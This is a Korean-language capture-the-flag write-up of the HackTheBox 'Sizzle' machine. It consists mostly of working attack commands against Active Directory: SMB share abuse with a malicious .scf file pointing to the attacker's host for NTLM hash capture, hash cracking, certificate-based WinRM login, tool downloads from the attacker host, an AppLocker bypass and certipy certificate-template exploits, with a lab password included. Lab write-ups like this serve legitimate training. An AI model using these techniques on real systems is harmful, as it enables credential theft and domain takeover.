---
layout: post
title: HackTheBox Sizzle
subtitle: Machine Sizzle Exam WriteUp
author: g3rm
categories: HTB
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - HTB
  - WriteUp
  - OSCP
  - AD
sidebar:
---
## Summary
![](assets/images/posts/2025-03-08-Sizzle/c85a008bf6289891ddee6fd8f83bd01d_MD5.jpeg)
## Target - 10.x.x.x
### Open Port
```bash
nmap -sC -sV -Pn -p- -oN Sizzle_allport 10.129.166.251
```
![](/assets/images/posts/2025-03-08-Sizzle/91a4fe3520641d350d9cd2c17fa526c3_MD5.jpeg)

### Web Enum
```bash
gobuster dir -u 10.129.89.62 -w /usr/share/wordlists/dirb/common.txt
```
![](/assets/images/posts/2025-03-08-Sizzle/0890786f6c0ab662374a5b273a0b20d6_MD5.jpeg)
### SMB Attack
```bash
crackmapexec smb 10.129.166.251 -u 'guest' -p '' --shares
crackmapexec smb 10.129.166.251 -u 'guest' -p '' --rid-brute

# smb folder mount
sudo mount -t cifs -o rw,username=guest,password= '//10.129.166.251/Department Shares' ./mnt
sudo ./writable.sh

sudo cp hack.scf /home/g3rrrm/Sizzle/mnt/Users/Public
sudo cp hack.scf /home/g3rrrm/Sizzle/mnt/ZZ_ARCHIVE

sudo responder -I tun0
```

```sh
# writable.sh
#!/bin/bash
list=$(find /home/g3rrrm/Sizzle/mnt -type d)
for d in $list
do
	touch $d/x 2>/dev/null
	if [ $? -eq 0 ]
	then
		echo $d " is writable"
	fi
done
```

```bash
# hack.scf
[Shell]
Command=2
IconFile=\\10.10.14.92\share\pwn.ico
[Taskbar]
Command=ToggleDesktop
```
![](/assets/images/posts/2025-03-08-Sizzle/feb90a37281f6081119d064d6c0c300d_MD5.jpeg)
![](/assets/images/posts/2025-03-08-Sizzle/16672031a8f50e465559f4f7dbdf0a21_MD5.jpeg)
![](assets/images/posts/2025-03-08-Sizzle/fc82eacd35aec5676eb07300e6cd4b3c_MD5.jpeg)
![](/assets/images/posts/2025-03-08-Sizzle/89969ad0325ec9c49a8363e96f6e8973_MD5.jpeg)
### Password Crack
```bash
hashcat -h | grep NTLM
hashcat -m 5600 amanda.hash /usr/share/wordlists/rockyou.txt
```
![](/assets/images/posts/2025-03-08-Sizzle/bb07d49603b833a15eba2b10bf594f06_MD5.jpeg)

### Evil-WinRM [Key Auth]
WinRM은 기본적으로 ID/PW 기반의 기본 인증을 통해 인증하지만, 인증서 기반 인증을 통해 인증할 수도 있다.
```bash
# openssl 통한 CSR 파일 생성
openssl req -new -newkey rsa:2048 -nodes -keyout private.key -out request.csr

# 그 후 http://10.129.89.62/certsrv/ : amanda : Ashare1972 를 통해 request.csr 업로드 후 cer 다운로드 [사진 참조]
cat request.csr

# 받은 cer로 인증 시도
evil-winrm -S -i 10.129.112.117 -u amanda -p Ashare1972 -c certnew.cer -k private.key
```

![](/assets/images/posts/2025-03-08-Sizzle/3d8b59e04c54f7fa179ee9814a386110_MD5.jpeg)
![](/assets/images/posts/2025-03-08-Sizzle/d224011add69d27ae61ee3aee5c2a1fc_MD5.jpeg)
![](/assets/images/posts/2025-03-08-Sizzle/144b5f744e59341ac128e8268ccc74c2_MD5.jpeg)
![](/assets/images/posts/2025-03-08-Sizzle/8cf46c442ad95dcf7d1e8cd5cd957537_MD5.jpeg)
![](/assets/images/posts/2025-03-08-Sizzle/02687eaeda255f9a483846f37269bd4d_MD5.jpeg)
![](/assets/images/posts/2025-03-08-Sizzle/4826fff15c51a7fcbd0059136518aa59_MD5.jpeg)
#### WinRM Shell [번외]
```bash
gem install winrm

# winrm_shell.rb 생성
require 'winrm'  
  
#Append necessary changes in winrm_shell.rb  
conn = WinRM::Connection.new(  
endpoint: 'https://10.10.10.103:5986/wsman' ,  
transport: :ssl,  
:client_cert => 'certnew.cer' , # from the server  
:client_key => 'private.key' , # private key  
:no_ssl_peer_verification => true)  
  
command=""  
  
conn.shell(:powershell) do |shell|  
	until command == "exit\n" do  
		output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")  
	print(output.output.chomp)  
		command = gets  
		output = shell.run(command) do |stdout, stderr|  
			STDOUT.print stdout  
			STDERR.print stderr  
		end  
	end  
	puts "Exiting with code #{output.exitcode}"  
end

# 실행
ruby winrm_shell.rb
```

### AppLocker Bypass
```powershell
# blocked
iwr -uri http://10.10.14.92:8000/winPEASx64.exe -OutFile winPEAS.exe
.\winPEAS.exe

# blocked
iwr -uri http://10.10.14.92:8000/SharpHound.ps1 -OutFile SharpHound.ps1
Import-Module .\SharpHound.ps1

# blocked
iwr -uri http://10.10.14.92:8000/Rebeus.exe -OutFile Rebeus.exe
.\Rebeus.exe

# bypass
# https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
Move-Item -Path C:\Users\Amanda\Rebeus.exe -Destination C:\Windows\Temp\Rebeus.exe
```



## 실패 모음
### AD CS [Active Directory Certificate Services]
88 Port [커버로스] 닫혀있어서 실패...
```bash
# http://10.129.89.62/certsrv/ : amanda : Ashare1972
certipy find -u amanda -p Ashare1972 -dc-ip 10.129.89.62 -vulnerable

# ESC4 Exploit : ECS4는 취약한 템플릿을 만들 수 있는 취약점
certipy template -dc-ip 10.129.89.62 -u amanda -p 'Ashare1972' -template SSL -target sizzle.htb.local -save-old

certipy req -ca 'HTB-SIZZLE-CA' -dc-ip 10.129.89.62 -u 'amanda' -p 'Ashare1972' -template SSL -target 'sizzle.htb.local' -upn 'Authenticated Users@htb.local'

# ESC1 Exploit : 
certipy req -u amanda -p 'Ashare1972' -ca 'HTB-SIZZLE-CA' -template SSL -dc-ip 10.129.89.62 -upn 'Administrators@htb.local'
certipy auth -pfx administrators.pfx -dc-ip 10.129.89.62
```
![](/assets/images/posts/2025-03-08-Sizzle/0b7776e5bf429f95044c8fb4e5e9c1f3_MD5.jpeg)
![](/assets/images/posts/2025-03-08-Sizzle/90fd5a11b99e4b8479c6619b5c6b0f68_MD5.jpeg)
![](/assets/images/posts/2025-03-08-Sizzle/f87d0086ead259e73afd7b15405c377c_MD5.jpeg)

![](/assets/images/posts/2025-03-08-Sizzle/74208aab76029e691df0a9d30c327b77_MD5.jpeg)
![](/assets/images/posts/2025-03-08-Sizzle/58218e4bf47327c33fc31589180b1f64_MD5.jpeg)
![](/assets/images/posts/2025-03-08-Sizzle/06a2d4d6f3b323ac6a2224ff2203209d_MD5.jpeg)
![](/assets/images/posts/2025-03-08-Sizzle/50f1e956227263d7c075ce19186f646b_MD5.jpeg)
### ING
```
Domain : HTB.LOCAL
DNS : sizzle.HTB.LOCAL

21 FTP
Anonymous FTP login allowed

80, 443 WEB
일단 별거 없어 보임

464
kpasswd Kerberos 암호화 키 변환 서비스

636, 3268, 3269 LDAP

ESC1, ESC2 취약함
"SUBCA@HTB.LOCAL"
Template Name : SubCA
```

```
Credential

amanda : Ashare1972
```